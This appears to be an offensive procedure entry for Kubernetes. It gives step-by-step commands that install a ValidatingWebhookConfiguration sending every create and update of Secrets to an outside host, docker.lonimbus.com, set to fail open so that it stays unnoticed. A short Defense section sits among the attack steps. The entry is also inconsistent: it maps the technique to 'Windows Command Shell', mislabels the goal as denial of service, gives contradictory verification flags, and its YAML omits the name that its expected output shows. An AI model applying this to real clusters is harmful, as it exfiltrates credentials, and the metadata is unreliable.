---
id: proc-install-webhook-001
tags:
  - validatingwebhook
  - kubectl
  - admission
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/kubectl-apply-webhook]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:32:01.437Z'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Install-ValidatingWebhookConfiguration

## Summary

This procedure applies a ValidatingWebhookConfiguration to the Kubernetes cluster, routing CREATE and UPDATE operations for secrets to an external webhook endpoint with a short timeout and ignore failure policy to enable the DoS exploitation without halting operations.

## Description

Validating Webhooks allow external validation of API requests. Here, a configuration is installed to intercept secret resource mutations, forwarding them to https://docker.lonimbus.com/validator. The failurePolicy is set to Ignore to ensure requests proceed even if the webhook fails, and timeoutSeconds is 1 to minimize delays. This YAML is applied via kubectl, targeting the API Server's admission chain. Prerequisites include cluster access and the external endpoint ready.

## Requirements

1. Kubectl configured with cluster credentials
2. External webhook endpoint operational
3. Cluster admin permissions

## Defense

Defensive measures and detection strategies:

- Audit webhook configurations regularly with `kubectl get validatingwebhookconfigurations`
- Restrict webhook creation to trusted admins
- Use sidecar injection or internal webhooks instead of external

## Objectives

1. Intercept large secret operations for external processing
2. Enable concurrent payload transmission
3. Maintain operation flow despite webhook issues

## Instructions

### Step 1: Prepare YAML Configuration

**Context**: Create validator.yaml with the webhook spec.

**Command** ([[commands/cat-create-yaml]]):
```bash
cat > validator.yaml <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
webhooks:
- name: secrets.validator.example.com
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["secrets"]
  failurePolicy: Ignore
  clientConfig:
    url: "https://docker.lonimbus.com/validator"
    caBundle: ""
  timeoutSeconds: 1
EOF
```

> Creates YAML; expected output: File written.

### Step 2: Apply the Configuration

**Context**: Install the webhook using kubectl apply.

**Command** ([[commands/kubectl-apply-webhook]]):
```bash
kubectl apply -f validator.yaml
```

> Applies config; expected output: validatingwebhookconfiguration.secrets.validator.example.com created.

### Step 3: Verify Installation

**Context**: Check if the webhook is active.

**Command** ([[commands/kubectl-get-webhook]]):
```bash
kubectl get validatingwebhookconfigurations
```

> Lists webhooks; expected output: Shows the configured webhook.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Windows Command Shell]] Windows Command Shell (Analogous to API Interception)

### Sub-Techniques


## Commands Used

- [[commands/kubectl-apply-webhook]]
- [[commands/kubectl-get-webhook]]
- [[commands/cat-create-yaml]]

## Tools Used

- [[tools/kubectl]]

## Tags

- validatingwebhook
- kubectl
- admission
